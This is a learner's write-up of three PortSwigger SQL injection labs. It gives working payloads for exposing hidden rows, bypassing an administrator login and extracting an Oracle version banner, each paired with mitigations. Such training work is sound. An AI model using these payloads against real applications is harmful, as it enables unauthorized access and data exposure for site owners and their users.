# 🔐 SQL Injection Labs Report (PortSwigger)

## 👨‍💻 Author

**Name:** Gaurav Jangir
**Track:** Bug Bounty / Web Security

---

## 📌 Overview

This report contains write-ups of SQL Injection labs from PortSwigger Web Security Academy. The labs demonstrate how improper input handling leads to critical vulnerabilities like data exposure and authentication bypass.

---

## 🧪 Lab 1: SQL Injection in WHERE Clause (Hidden Data)

**Level:** Apprentice

**Vulnerability:**
The application directly includes user input in SQL query:

```sql
SELECT * FROM products WHERE category = 'Gifts'
```

**Payload Used:**

```sql
' OR 1=1 --
```

**Exploitation:**

```sql
SELECT * FROM products WHERE category = '' OR 1=1 --'
```

**Result:**
All products including hidden items were displayed.

**Impact:**
Sensitive/hidden data exposure.

**Mitigation:**

* Use Prepared Statements
* Validate user input
* Avoid dynamic queries

---

## 🧪 Lab 2: SQL Injection Login Bypass

**Level:** Apprentice

**Vulnerability:**

```sql
SELECT * FROM users WHERE username = 'input' AND password = 'input'
```

**Payload Used:**

```sql
administrator' --
```

**Exploitation:**

```sql
SELECT * FROM users WHERE username = 'administrator' --' AND password = ''
```

**Result:**
Logged in as administrator without password.

**Impact:**
Authentication bypass → Full account takeover.

**Mitigation:**

* Parameterized queries
* Secure authentication logic
* Input sanitization

---

## 🧪 Lab 3: SQL Injection (Oracle DB Version Extraction)

**Level:** Practitioner

**Vulnerability:**
Application reflects SQL query results.

**Payload Used:**

```sql
' UNION SELECT banner, NULL FROM v$version --
```

**Exploitation:**

```sql
SELECT name, description FROM products WHERE category = '' 
UNION SELECT banner, NULL FROM v$version --
```

**Result:**
Oracle database version extracted.

**Impact:**
Information disclosure → helps in further attacks.

**Mitigation:**

* Prepared statements
* Restrict DB permissions
* Hide error messages

---

## 🧠 Key Learnings

* SQL Injection occurs due to unsanitized input
* Common attack types:

  * Authentication bypass
  * Data extraction
  * UNION-based attacks
* Always test inputs:

  * Forms
  * URL parameters
  * Cookies

---

## 🛠️ Tools Used

* Burp Suite
* Browser DevTools
* Manual Testing

---

## 📌 Conclusion

These labs helped in understanding real-world SQL Injection vulnerabilities and exploitation techniques. This forms a strong base for bug bounty hunting.

---

## 🚀 Next Steps

* Practice Blind SQL Injection
* Learn Time-based SQLi
* Use automation tools like sqlmap

---
